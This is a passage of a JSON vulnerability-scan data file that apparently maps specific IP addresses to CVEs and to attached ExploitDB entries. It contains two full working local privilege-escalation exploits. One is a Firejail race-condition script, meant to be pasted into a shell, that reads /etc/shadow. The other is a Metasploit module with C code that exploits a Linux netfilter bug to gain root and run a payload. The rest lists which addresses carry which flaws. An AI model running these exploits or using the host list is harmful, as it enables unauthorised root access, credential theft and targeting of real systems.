non-root users\r\n        uid_t uid = getuid();\r\n        if (uid != 0) {\r\n                uid_t sandbox_uid = pid_get_uid(pid);\r\n                if (uid != sandbox_uid) {\r\n                        fprintf(stderr, \"Error: permission denied.\\n\");\r\n                        exit(1);\r\n                }\r\n        }\r\n\r\n        // full path or file in current directory?\r\n        char *fname;\r\n        if (*path == '/') {\r\n                fname = strdup(path);\r\n                if (!fname)\r\n                        errExit(\"strdup\");\r\n        }\r\n        else if (*path == '~') {\r\n                if (asprintf(&fname, \"%s%s\", cfg.homedir, path + 1) == -1)\r\n                        errExit(\"asprintf\");\r\n        }\r\n        else {\r\n                fprintf(stderr, \"Error: Cannot access %s\\n\", path);\r\n                exit(1);\r\n        }\r\n\r\n        // sandbox root directory\r\n        char *rootdir;\r\n        if (asprintf(&rootdir, \"/proc/%d/root\", pid) == -1)\r\n                errExit(\"asprintf\");\r\n\r\n        if (op == SANDBOX_FS_LS) {\r\n                EUID_ROOT();\r\n                // chroot\r\n                if (chroot(rootdir) < 0)\r\n                        errExit(\"chroot\");\r\n                if (chdir(\"/\") < 0)\r\n                        errExit(\"chdir\");\r\n\r\n                // access chek is performed with the real UID\r\n                if (access(fname, R_OK) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                // list directory contents\r\n                struct stat s;\r\n                if (stat(fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n                if (S_ISDIR(s.st_mode)) {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n\r\n                        char *dir;\r\n                        if (asprintf(&dir, \"%s/\", rp) == -1)\r\n                                errExit(\"asprintf\");\r\n\r\n                        print_directory(dir);\r\n                        free(rp);\r\n                        free(dir);\r\n                }\r\n                else {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n                        char *split = strrchr(rp, '/');\r\n                        if (split) {\r\n                                *split = '\\0';\r\n                                char *rp2 = split + 1;\r\n                                if (arg_debug)\r\n                                        printf(\"path %s, file %s\\n\", rp, rp2);\r\n                                print_file_or_dir(rp, rp2, 1);\r\n                        }\r\n                        free(rp);\r\n                }\r\n        }\r\n\r\n        // get file from sandbox and store it in the current directory\r\n        else if (op == SANDBOX_FS_GET) {\r\n                // check source file (sandbox)\r\n                char *src_fname;\r\n                if (asprintf(&src_fname, \"%s%s\", rootdir, fname) == -1)\r\n                        errExit(\"asprintf\");\r\n                EUID_ROOT();\r\n                struct stat s;\r\n                if (stat(src_fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n\r\n                // try to open the source file - we need to chroot\r\n                pid_t child = fork();\r\n                if (child < 0)\r\n                        errExit(\"fork\");\r\n                if (child == 0) {\r\n                        // chroot\r\n                        if (chroot(rootdir) < 0)\r\n                                errExit(\"chroot\");\r\n                        if (chdir(\"/\") < 0)\r\n                                errExit(\"chdir\");\r\n\r\n                        // drop privileges\r\n                        drop_privs(0);\r\n\r\n                        // try to read the file\r\n                        if (access(fname, R_OK) == -1) {\r\n                                fprintf(stderr, \"Error: Cannot read %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        exit(0);\r\n                }\r\n\r\n                // wait for the child to finish\r\n                int status = 0;\r\n                waitpid(child, &status, 0);\r\n                if (WIFEXITED(status) && WEXITSTATUS(status) == 0);\r\n                else\r\n                        exit(1);\r\n                EUID_USER();\r\n\r\n                // check destination file (host)\r\n                char *dest_fname = strrchr(fname, '/');\r\n                if (!dest_fname || *(++dest_fname) == '\\0') {\r\n                        fprintf(stderr, \"Error: invalid file name %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                if (access(dest_fname, F_OK) == -1) {\r\n                        // try to create the file\r\n                        FILE *fp = fopen(dest_fname, \"w\");\r\n                        if (!fp) {\r\n                                fprintf(stderr, \"Error: cannot create %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                        fclose(fp);\r\n                }\r\n                else {\r\n                        if (access(dest_fname, W_OK) == -1) {\r\n                                fprintf(stderr, \"Error: cannot write %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                }\r\n                // copy file\r\n                EUID_ROOT();\r\n                copy_file(src_fname, dest_fname, getuid(), getgid(), 0644);\r\n                printf(\"Transfer complete\\n\");\r\n                EUID_USER();\r\n        }\r\n\r\n        free(fname);\r\n        free(rootdir);\r\n\r\n        exit(0);\r\n}\r\n~~~~\r\n\r\n\r\n\r\n### Code: src/firejail/util.c\r\n~~~~\r\nint copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {\r\n        assert(srcname);\r\n        assert(destname);\r\n\r\n        // open source\r\n        int src = open(srcname, O_RDONLY);\r\n        if (src < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", srcname);\r\n                return -1;\r\n        }\r\n\r\n        // open destination\r\n        int dst = open(destname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\r\n        if (dst < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", destname);\r\n                close(src);\r\n                return -1;\r\n        }\r\n\r\n        // copy\r\n        ssize_t len;\r\n        static const int BUFLEN = 1024;\r\n        unsigned char buf[BUFLEN];\r\n        while ((len = read(src, buf, BUFLEN)) > 0) {\r\n                int done = 0;\r\n                while (done != len) {\r\n                        int rv = write(dst, buf + done, len - done);\r\n                        if (rv == -1) {\r\n                                close(src);\r\n                                close(dst);\r\n                                return -1;\r\n                        }\r\n\r\n                        done += rv;\r\n                }\r\n        }\r\n\r\n        if (fchown(dst, uid, gid) == -1)\r\n                errExit(\"fchown\");\r\n        if (fchmod(dst, mode) == -1)\r\n                errExit(\"fchmod\");\r\n\r\n        close(src);\r\n        close(dst);\r\n        return 0;\r\n}\r\n</snip>\r\n~~~~\r\n\r\n## Testing \r\n\r\n### Our Dockerfile\r\n\r\n~~~~\r\nFROM ubuntu:latest\r\n\r\nENV wdir /root/firejail\r\n\r\nRUN apt-get update && apt-get install -y git gcc make\r\nRUN useradd -ms /bin/bash daniel && echo \"daniel:password\" | chpasswd\r\nRUN git clone https://github.com/netblue30/firejail.git ${wdir}\r\nWORKDIR ${wdir}\r\nRUN git reset --hard 81467143ee9c47d9c90e97fb55baf2d47702d372\r\nRUN ./configure && make && make install\r\n~~~~\r\n\r\n### Our exploit\r\n\r\nThis will exploit the --get command to read /etc/shadow and print back to the console. Just copy and paste into your shell:\r\n\r\n~~~~\r\n#dropper\r\ncat > gexp.sh <<GUEST_JAIL_SCRIPT_EOF\r\nmkdir -p /tmp/exploit\r\ncat > /tmp/exploit/gaolbreak.c <<TOCTOU_POC_END\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    char *fl = \"/etc/shadow\";\r\n\r\n    if(argc > 1) {\r\n        fl = argv[1];\r\n    }\r\n\r\n    while(1) {\r\n        int fd = open(\"owned\", O_CREAT | O_RDWR, 0777);\r\n        if(fd == -1) {\r\n            perror(\"open\");\r\n            exit(1);\r\n        }\r\n        close(fd);\r\n        remove(\"owned\");\r\n        symlink(fl, \"owned\");\r\n        remove(\"owned\");\r\n    }\r\n}\r\nTOCTOU_POC_END\r\ncd /tmp/exploit\r\ngcc ./gaolbreak.c -o gaolbreak\r\n# XXX: change argv[1] to whatever you want\r\n./gaolbreak /etc/shadow\r\nGUEST_JAIL_SCRIPT_EOF\r\n\r\n# run the dropper (symlink attack) in a jail\r\nchmod +x ./gexp.sh\r\nfirejail --noprofile --force --name=el ./gexp.sh &\r\n\r\n# win race using the vulnerable 'firejail --get' command.\r\nmkdir exploitel\r\ncd exploitel\r\nwhile [ 1 ] ; do nice -n 19 firejail --get=$(pgrep -f '^firejail.*--name=el' -n) /tmp/exploit/owned >/dev/null 2>&1; cat owned 2>/dev/null; done\r\n~~~~",
                "description": "Firejail - Local Privilege Escalation",
                "author": "Daniel Hodson",
                "_id": 41022,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-01-09T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \"msf/core\"\r\n\r\nclass MetasploitModule < Msf::Exploit::Local\r\n  Rank = GoodRanking\r\n\r\n  include Msf::Post::File\r\n  include Msf::Exploit::EXE\r\n  include Msf::Exploit::FileDropper\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',\r\n        'Description'    => %q{\r\n          This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3, and currently\r\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel\r\n          4.4.0-21-generic.\r\n          Several conditions have to be met for successful exploitation:\r\n          Ubuntu:\r\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\r\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686  & libgcc.i686 (fedora) needs to be installed to compile\r\n          Kernel 4.4.0-31-generic and newer are not vulnerable.\r\n\r\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\r\n          having cdefs.h (even if locally installed)\r\n        },\r\n        'License'        => MSF_LICENSE,\r\n        'Author'         =>\r\n          [\r\n            'h00die <mike@stcyrsecurity.com>',  # Module\r\n            'vnik'                         # Discovery\r\n          ],\r\n        'DisclosureDate' => 'Jun 03 2016',\r\n        'Platform'       => [ 'linux'],\r\n        'Arch'           => [ ARCH_X86 ],\r\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\r\n        'Targets'        =>\r\n          [\r\n            [ 'Ubuntu', { } ]\r\n            #[ 'Fedora', { } ]\r\n          ],\r\n        'DefaultTarget'  => 0,\r\n        'References'     =>\r\n          [\r\n            [ 'EDB', '40049'],\r\n            [ 'CVE', '2016-4997'],\r\n            [ 'URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c']\r\n          ]\r\n      ))\r\n    register_options(\r\n      [\r\n        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),\r\n        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),\r\n        OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),\r\n        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\r\n      ], self.class)\r\n  end\r\n\r\n  def check\r\n    def iptables_loaded?()\r\n      # user@ubuntu:~$ cat /proc/modules | grep ip_tables\r\n      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000\r\n      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000\r\n      vprint_status('Checking if ip_tables is loaded in kernel')\r\n      if target.name == \"Ubuntu\"\r\n        iptables = cmd_exec('cat /proc/modules | grep ip_tables')\r\n        if iptables.include?('ip_tables')\r\n          vprint_good('ip_tables.ko is loaded')\r\n        else\r\n          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('ip_tables')\r\n      elsif target.name == \"Fedora\"\r\n        iptables = cmd_exec('cat /proc/modules | grep iptable_raw')\r\n        if iptables.include?('iptable_raw')\r\n          vprint_good('iptable_raw is loaded')\r\n        else\r\n          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('iptable_raw')\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    def shemsham_installed?()\r\n      # we want this to be false.\r\n      vprint_status('Checking if shem or sham are installed')\r\n      shemsham = cmd_exec('cat /proc/cpuinfo')\r\n      if shemsham.include?('shem')\r\n        print_error('shem installed, system not vulnerable.')\r\n      elsif shemsham.include?('sham')\r\n        print_error('sham installed, system not vulnerable.')\r\n      else\r\n        vprint_good('shem and sham not present.')\r\n      end\r\n      return (shemsham.include?('shem') or shemsham.include?('sham'))\r\n    end\r\n\r\n    if iptables_loaded?() and not shemsham_installed?()\r\n      return CheckCode::Appears\r\n    else\r\n      return CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.\r\n    def has_prereqs?()\r\n      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')\r\n      if target.name == \"Ubuntu\"\r\n        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')\r\n        if lib.include?('install')\r\n          vprint_good('libc6-dev-i386 is installed')\r\n        else\r\n          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')\r\n        if multilib.include?('install')\r\n          vprint_good('gcc-multilib is installed')\r\n        else\r\n          print_error('gcc-multilib is not installed.  Compiling will fail.')\r\n        end\r\n        gcc = cmd_exec('which gcc')\r\n        if gcc.include?('gcc')\r\n          vprint_good('gcc is installed')\r\n        else\r\n          print_error('gcc is not installed.  Compiling will fail.')\r\n        end\r\n        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')\r\n      elsif target.name == \"Fedora\"\r\n        lib = cmd_exec('dnf list installed | grep -E \\'(glibc-devel.i686|libgcc.i686)\\'')\r\n        if lib.include?('glibc')\r\n          vprint_good('glibc-devel.i686 is installed')\r\n        else\r\n          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        if lib.include?('libgcc')\r\n          vprint_good('libgcc.i686 is installed')\r\n        else\r\n          print_error('libgcc.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = false #not implemented\r\n        gcc = false #not implemented\r\n        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    compile = false\r\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\r\n      if has_prereqs?()\r\n        compile = true\r\n        vprint_status('Live compiling exploit on system')\r\n      else\r\n        vprint_status('Dropping pre-compiled exploit on system')\r\n      end\r\n    end\r\n    if check != CheckCode::Appears\r\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\r\n    end\r\n\r\n    desc_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    env_ready_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    pwn_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    payload_file = rand_text_alpha(8)\r\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"\r\n\r\n    # direct copy of code from exploit-db, except removed the check for shem/sham and ip_tables.ko since we can do that in the check area here\r\n    # removed         #include <netinet/in.h> per busterb comment in PR 7326\r\n    decr = %q{\r\n      #define _GNU_SOURCE\r\n      #include <stdio.h>\r\n      #include <stdlib.h>\r\n      #include <string.h>\r\n      #include <unistd.h>\r\n      #include <sched.h>\r\n      #include <netinet/in.h>\r\n      #include <linux/sched.h>\r\n      #include <errno.h>\r\n      #include <sys/types.h>\r\n      #include <sys/socket.h>\r\n      #include <sys/ptrace.h>\r\n      #include <net/if.h>\r\n      #include <linux/netfilter_ipv4/ip_tables.h>\r\n      #include <linux/netlink.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n\r\n      #define MALLOC_SIZE 66*1024\r\n\r\n      int decr(void *p) {\r\n          int sock, optlen;\r\n          int ret;\r\n          void *data;\r\n          struct ipt_replace *repl;\r\n          struct ipt_entry *entry;\r\n          struct xt_entry_match *ematch;\r\n          struct xt_standard_target *target;\r\n          unsigned i;\r\n\r\n          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);\r\n\r\n          if (sock == -1) {\r\n                  perror(\"socket\");\r\n                  return -1;\r\n          }\r\n\r\n          data = malloc(MALLOC_SIZE);\r\n\r\n          if (data == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          memset(data, 0, MALLOC_SIZE);\r\n\r\n          repl = (struct ipt_replace *) data;\r\n          repl->num_entries = 1;\r\n          repl->num_counters = 1;\r\n          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;\r\n          repl->valid_hooks = 0;\r\n\r\n          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));\r\n          entry->target_offset = 74; // overwrite target_offset\r\n          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);\r\n\r\n          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));\r\n\r\n          strcpy(ematch->u.user.name, \"icmp\");\r\n          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);\r\n          uint64_t *me = (uint64_t *)(kmatch + 0x58);\r\n          *me = 0xffffffff821de10d; // magic number!\r\n\r\n          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);\r\n          *match = (uint32_t)kmatch;\r\n\r\n          ematch->u.match_size = (short)0xffff;\r\n\r\n          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);\r\n          uint32_t *t = (uint32_t *)target;\r\n          *t = (uint32_t)kmatch;\r\n\r\n          printf(\"[!] Decrementing the refcount. This may take a while...\\n\");\r\n          printf(\"[!] Wait for the \\\"Done\\\" message (even if you'll get the prompt back).\\n\");\r\n\r\n          for (i = 0; i < 0xffffff/2+1; i++) {\r\n              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);\r\n          }\r\n\r\n          close(sock);\r\n          free(data);\r\n          printf(\"[+] Done! Now run ./pwn\\n\");\r\n\r\n          return 0;\r\n      }\r\n\r\n      int main(void) {\r\n          void *stack;\r\n          int ret;\r\n\r\n          printf(\"netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\\n\");\r\n\r\n          ret = unshare(CLONE_NEWUSER);\r\n\r\n          if (ret == -1) {\r\n              perror(\"unshare\");\r\n              return -1;\r\n          }\r\n\r\n          stack = (void *) malloc(65536);\r\n\r\n          if (stack == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          clone(decr, stack + 65536, CLONE_NEWNET, NULL);\r\n\r\n          sleep(1);\r\n\r\n          return 0;\r\n      }\r\n    }\r\n\r\n    # direct copy of code from exploit-db\r\n    pwn = %q{\r\n      #include <stdio.h>\r\n      #include <string.h>\r\n      #include <errno.h>\r\n      #include <unistd.h>\r\n      #include <stdint.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n      #include <assert.h>\r\n\r\n      #define MMAP_ADDR 0xff814e3000\r\n      #define MMAP_OFFSET 0xb0\r\n\r\n      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);\r\n      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);\r\n\r\n      void __attribute__((regparm(3))) privesc() {\r\n          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;\r\n          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;\r\n          commit_creds(prepare_kernel_cred((uint64_t)NULL));\r\n      }\r\n\r\n      int main() {\r\n          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);\r\n          assert(payload == (void *)MMAP_ADDR);\r\n\r\n          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);\r\n\r\n          memset(shellcode, 0, 0x300000);\r\n\r\n          void *ret = memcpy(shellcode, &privesc, 0x300);\r\n          assert(ret == shellcode);\r\n\r\n          printf(\"[+] Escalating privs...\\n\");\r\n\r\n          int fd = open(\"/dev/ptmx\", O_RDWR);\r\n          close(fd);\r\n\r\n          assert(!getuid());\r\n\r\n          printf(\"[+] We've got root!\");\r\n\r\n          return execl(\"/bin/bash\", \"-sh\", NULL);\r\n      }\r\n    }\r\n\r\n    # the original code printed a line.  However, this is hard to detect due to threading.\r\n    # so instead we can write a file in /tmp to catch.\r\n    decr.gsub!(/printf\\(\"\\[\\+\\] Done\\! Now run \\.\\/pwn\\\\n\"\\);/,\r\n               \"int fd2 = open(\\\"#{env_ready_file}\\\", O_RDWR|O_CREAT, 0777);close(fd2);\" )\r\n\r\n    # patch in to run our payload\r\n    pwn.gsub!(/execl\\(\"\\/bin\\/bash\", \"-sh\", NULL\\);/,\r\n               \"execl(\\\"#{payload_path}\\\", NULL);\")\r\n\r\n    def pwn(payload_path, pwn_file, pwn, compile)\r\n      # lets write our payload since everythings set for priv esc\r\n      vprint_status(\"Writing payload to #{payload_path}\")\r\n      write_file(payload_path, generate_payload_exe)\r\n      cmd_exec(\"chmod 555 #{payload_path}\")\r\n      register_file_for_cleanup(payload_path)\r\n\r\n      # now lets drop part 2, and finish up.\r\n      rm_f pwn_file\r\n      if compile\r\n        print_status \"Writing pwn executable to #{pwn_file}.c\"\r\n        rm_f \"#{pwn_file}.c\"\r\n        write_file(\"#{pwn_file}.c\", pwn)\r\n        cmd_exec(\"gcc #{pwn_file}.c -O2 -o #{pwn_file}\")\r\n        register_file_for_cleanup(\"#{pwn_file}.c\")\r\n      else\r\n        print_status \"Writing pwn executable to #{pwn_file}\"\r\n        write_file(pwn_file, pwn)\r\n      end\r\n      register_file_for_cleanup(pwn_file)\r\n      cmd_exec(\"chmod +x #{pwn_file}; #{pwn_file}\")\r\n    end\r\n\r\n    if not compile # we need to override with our pre-created binary\r\n      # pwn file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      pwn = fd.read(fd.stat.size)\r\n      fd.close\r\n      # desc file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      decr = fd.read(fd.stat.size)\r\n      fd.close\r\n\r\n      # overwrite the hardcoded variable names in the compiled versions\r\n      env_ready_file = '/tmp/okDjTFSS'\r\n      payload_path = '/tmp/2016_4997_payload'\r\n    end\r\n\r\n    # check for shortcut\r\n    if datastore['REEXPLOIT']\r\n      pwn(payload_path, pwn_file, pwn, compile)\r\n    else\r\n      rm_f desc_file\r\n      if compile\r\n        print_status \"Writing desc executable to #{desc_file}.c\"\r\n        rm_f \"#{desc_file}.c\"\r\n        write_file(\"#{desc_file}.c\", decr)\r\n        register_file_for_cleanup(\"#{desc_file}.c\")\r\n        output = cmd_exec(\"gcc #{desc_file}.c -m32 -O2 -o #{desc_file}\")\r\n      else\r\n        write_file(desc_file, decr)\r\n      end\r\n      rm_f env_ready_file\r\n      register_file_for_cleanup(env_ready_file)\r\n      #register_file_for_cleanup(desc_file)\r\n      if not file_exist?(desc_file)\r\n        vprint_error(\"gcc failure output: #{output}\")\r\n        fail_with(Failure::Unknown, \"#{desc_file}.c failed to compile\")\r\n      end\r\n      if target.name == \"Ubuntu\"\r\n        vprint_status \"Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      elsif target.name == \"Fedora\"\r\n        vprint_status \"Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      end\r\n      cmd_exec(\"chmod +x #{desc_file}; #{desc_file}\")\r\n      sec_waited = 0\r\n\r\n      until sec_waited > datastore['MAXWAIT'] do\r\n        Rex.sleep(1)\r\n        if sec_waited % 10 == 0\r\n          vprint_status(\"Waited #{sec_waited}s so far\")\r\n        end\r\n\r\n        if file_exist?(env_ready_file)\r\n          print_good(\"desc finished, env ready.\")\r\n          pwn(payload_path, pwn_file, pwn, compile)\r\n          return\r\n        end\r\n        sec_waited +=1\r\n      end\r\n    end\r\n  end\r\nend",
                "description": "Linux Kernel 4.6.3 (x86) - 'Netfilter' Local Privilege Escalation (Metasploit)",
                "author": "Metasploit",
                "_id": 40435,
                "source": "ExploitDB",
                "platform": "linux_x86",
                "date": "2016-09-27T00:00:00+00:00",
                "cve": [
                    "CVE-2016-4997"
                ],
                "type": "local",
                "port": 0
            }
        ]
    },
    "152.1.52.218": {},
    "152.1.53.1": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.18": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.40": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.76": {
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.163": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.193": {},
    "152.1.53.212": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.223": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.53.245": {},
    "152.1.53.246": {
        "CVE-2010-2068": [
            {
                "source": "CVE",
                "_id": "2010-2791",
                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
                "osvdb": [],
                "bid": [
                    42102
                ],
                "cve": [
                    "CVE-2010-2791"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2010-2068",
